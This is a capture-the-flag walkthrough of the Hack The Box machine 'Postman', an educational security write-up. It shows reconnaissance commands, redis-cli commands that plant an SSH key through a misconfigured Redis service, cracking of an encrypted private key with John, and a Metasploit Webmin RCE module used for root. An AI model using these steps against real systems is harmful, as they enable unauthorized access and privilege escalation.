![[https://www.hackthebox.eu/home/machines/profile/215](../img/Postman Writeup/1_2j3KMD5ILPENt6Jkm9bhEg.png)](https://cdn-images-1.medium.com/max/1162/1*2j3KMD5ILPENt6Jkm9bhEg.png)

# TL;DR

Postman from Hack the Box is an easy-rated box which includes exploiting a misconfigured Redis service, allowing you to drop your public key to ssh in the box. It leads to an encrypted SSH private key which is easily crackable through John to get user. For root, I exploit a authenticated vulnerability using Metasploit.

# Scanning

I first run an nmap scan with -sV (determine service/version info) and -sC (run default nmap scripts on ports), saving it to all formats (-oA), calling it initial:

```
nmap -sV -sC -oA nmap/initial 10.10.10.160
```

The results show that port 22 which is running OpenSSH 7.6p1, port 80 running Apache httpd 2.4.29, and port 10000 running MiniServ 1.910 (Webmin httpd). Note that it mentions that the box is Ubuntu. I won’t bother with SSH as the version is recent and there are no recent exploits for OpenSSH that are useful in this scenario.

![](../img/Postman Writeup/1_A__gBs3bhd0JB_dSFPVTHg.png)

I also run a scan for all TCP ports with the -p- flag. Note that nmap only scans the top 1000 ports(not in order, but really the top 1000 common ports).

```
nmap -p- --max-retries 1 -oA nmap/allports-tcp 10.10.10.160
```

![](../img/Postman Writeup/1_gvYMz1i5jcP8Wpug0Duu4A.png)

It shows that port 6379 is open, which is missed by my initial scan.

#### Port 80

Visiting the page, it mentions that it is under construction.

![](../img/Postman Writeup/1__ik5bR64rgSLSskjYCKAgQ.png)

Scrolling down mentions a “postman@htb”, and a thing about cookies.

![](../img/Postman Writeup/1_h7vXe6y02CyDOGDqRo450Q.png)

I then run [Gobuster ](https://github.com/OJ/gobuster)to check for interesting directories:

```
gobuster dir -u [http://10.10.10.160](http://10.10.10.160) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root
```

The results shows an upload folder:

![](../img/Postman Writeup/1_6XtA_0GKbPng8eo2T202jA.png)

Visiting /upload, I can see images that are used in the website. I found nothing interesting in the other directories.

![](../img/Postman Writeup/1_4I1B_DaacJIoFj1GjrbMIg.png)

#### Port 10000

Since nothing is interesting in port 80, I visit port 10000 and it mentions that the web server is running in SSL mode.

![](../img/Postman Writeup/1_8ZFTmQyW7_GqGd734Z_7Tw.png)

I also add an entry to my hosts file(/etc/hosts) since I’m using Kali when I solved this box. Visiting the page shows login page to the server postman.

> Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.

![](../img/Postman Writeup/1_llXHluk81UB0GVyDsL3qlg.png)

I try to login using basic credentials like admin:admin, but it doesn’t work:

![](../img/Postman Writeup/1_H3RrNxxEkBDEk_dJ2MuJkA.png)

Since it is a web-based interface for system administration for Unix, I check searchsploit for any exploits I can use:

![](../img/Postman Writeup/1_2nqqrZhYyfLJehN2xEqD2Q.png)

Since Webmin is running version 1.910, only a few exploits is available. One exploit that is an RCE for version 1.910 requires a valid login when inspecting the exploit.

#### Port 6379 — Redis

I now try to dig in with the Redis service.

> Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams.

I first look for ways to interact with the Redis service. Common ways are using telnet, and using the redis-cli. When I initially solved this box, I used telnet but for this writeup I used redis-cli. Using the redis-cli is much easier in this scenario but it is good to know that you can interact with it using telnet.

I first check if I connected properly:

![](../img/Postman Writeup/1_hWiblo6UAE1o_mpmrckmmA.png)

Then I check the current directory I am in:

![](../img/Postman Writeup/1_WazBQsb69XWqNndx9HnApQ.png)

Finding out that I’m at /var/lib/redis, I try if I can change directories. I did this to find out if I can guess which directories are available/accessible as this Redis user.

![](../img/Postman Writeup/1__mOhorgLQnCqsV-4ANtvOw.png)

I then run config get \* to list all the supported configuration parameters. One thing that stands out is “authorized_keys”. I usually come across this in an SSH directory. An authorized_keys file contains the public keys of the users who can login through SSH using key-based.

![](../img/Postman Writeup/1_f4kPt6SmXz7Aeg4dJQjMSA.png)

There is also an entry for /var/lib/redis/.ssh:

![](../img/Postman Writeup/1_uwMYppGsNXUGb1XxPHTypA.png)

I tried to change my directory to it:

![](../img/Postman Writeup/1_ItG-8nqbEZC8xl3_1fYl4Q.png)

Knowing that a /.ssh directory is inside the redis folder, I then looked for write ups on how I can leverage Redis with a /.ssh and came across this page: [http://antirez.com/news/96](http://antirez.com/news/96). I suggest you read it to learn more about Redis security misconfigurations.

I then generate a ssh key pair using the ssh-keygen command:

![](../img/Postman Writeup/1_nMPEHnxL8J_04hkmhWg4lw.png)

I then save the contents of the public key using with new lines to make sure the format is consistent:

```
(echo -e "\n\n"; cat sifo.pub; echo -e "\n\n") > foo.txt
```

I then pipe the contents to the redis-cli command and dump it into its memory:

```
cat foo.txt | redis-cli -h 10.10.10.160  -x set crackit
```

I then save what’s in memory to a file called authorized_keys

![](../img/Postman Writeup/1_cAh_DmPmwSyC4KIK9H2CLQ.png)

I then try to SSH using the Redis user, and is able to do so.

![](../img/Postman Writeup/1_Qp5vDKOI4RvtgC6iE_Aemw.png)

#### Redis → Matt

Checking the files in the current directory, I tried to read what’s inside its bash_history file.

![](../img/Postman Writeup/1_YGnrKpKOjS11-5d4O9eQDg.png)

There is an entry of “su Matt” in the bash_history file, a mention of an “id_rsa.bak” and a mention of the sshd_config.

![](../img/Postman Writeup/1_dB49bVV9ZuAiPPiQhSHIYA.png)

I check the passwd file and see that there is a user Matt.

![](../img/Postman Writeup/1_hE-MTDzdtvmQK2jrFxnEyA.png)

I then check for files owned by the Matt:

```
redis@Postman:~$ find / -user Matt 2>/dev/null
/opt/id_rsa.bak
/home/Matt
/home/Matt/.bashrc
/home/Matt/.bash_history
/home/Matt/.gnupg
/home/Matt/.ssh
/home/Matt/user.txt
/home/Matt/.selected_editor
/home/Matt/.local
/home/Matt/.local/share
/home/Matt/.profile
/home/Matt/.cache
/home/Matt/.wget-hsts
/home/Matt/.bash_logout
/var/www/SimpleHTTPPutServer.py
```

It seems that there is backup of an id_rsa file(usually a private key use for SSH) stored in /opt. I move the file to my machine using netcat:

![](../img/Postman Writeup/1_TKOdUs3NCJCTz_ArXn0_lg.png)

Checking its contents, it is encrypted:

![](../img/Postman Writeup/1_HLqrXaghuLSzxQRsHF4c4g.png)

I then try to crack it using John. I first have to convert the file in a format that John accepts. This can be done using ssh2john.py:

```
ssh2john.py id_rsa.bak > id_rsa.enc
```

I then crack it using John:

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.enc
```

The password is computer 2008.

![](../img/Postman Writeup/1_Fruo3IRDQ7nHmN4qYTyoow.png)

I then tried to login using the private key, and when asked for the password, use computer2008:

![](../img/Postman Writeup/1_BueZquKD0cydd-uvJXODxw.png)

The login is unsuccessful, and prompts me to the root login, asking me for a password. I tried to just switch to the user Matt, using the password computer2008, and it works.

![](../img/Postman Writeup/1_VvDTFz1tU8g7-YQqPOE14Q.png)

I can now read user.txt:

```
Matt@Postman:~$ cat user.txt
517ad0ec24....
```

#### Matt → Root

I then check for running processes, and find that Webmin is running as root:

![](../img/Postman Writeup/1_Hld-SIii26d2MfCyfvAC7w.png)

I tried to login using the credentials Matt:computer2008, and it works!

![](../img/Postman Writeup/1_34UcxJy48PstZyphvLCMVQ.png)

I then comeback to the exploit mentioned earlier which requires credentials. The vulnerability allows a user authorized to the “Package Updates” module execute arbitrary commands with root privileges. Details of the vulnerability and exploit can be found here: [https://www.cvedetails.com/cve/CVE-2019-12840/](https://www.cvedetails.com/cve/CVE-2019-12840/)

I then run Metasploit and use exploit/linux/http/webmin_packageup_rce. The options that were set can be seen below:

![](../img/Postman Writeup/1_4PM1T8jA-MNLOEh05_PLVw.png)

Running the exploit leads to a root shell:

![](../img/Postman Writeup/1_vcomnDH-ECQW5BK_mJGAZQ.png)

And now I can now read root.txt..

```
cat /root/root.txt
a257741c5bed8b....
```

I checked into the /etc/ssh/sshd_config and found out that Matt was denied to login using SSH, hence it not working.

![](../img/Postman Writeup/1_5Dho9G_UyGGQVTqe0jz9dA.png)

I also tried to get a shell, which I am able to by using bash -c:

![](../img/Postman Writeup/1_Afg5PSMlvBbd1nKzfhAoIQ.png)

I checked the files under root’s home directory, and found that bash_history is not empty and its size is 14350 characters, which means that maybe I can see how the box creator made the box:

![](../img/Postman Writeup/1_PXQWggn8NlPI1_Rl9XErcA.png)

Checking the first few commands, it shows how the user installed ssh, installed net-tools, and added the user Matt 😺

![](../img/Postman Writeup/1_owFcw8FemI_9JQJx8jcwIg.png)

And that’s how I solved Postman from HacktheBox! It was a very long journey but definitely worth it! Thanks for reading! 🍺

---

_Follow [Infosec Write-ups](https://medium.com/bugbountywriteup) for more such awesome write-ups._

> [**InfoSec Write-ups**](https://medium.com/bugbountywriteup)
>
> <small>A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. In a nutshell, we are the largest InfoSec publication on Medium. Maintained by Hackrew</small>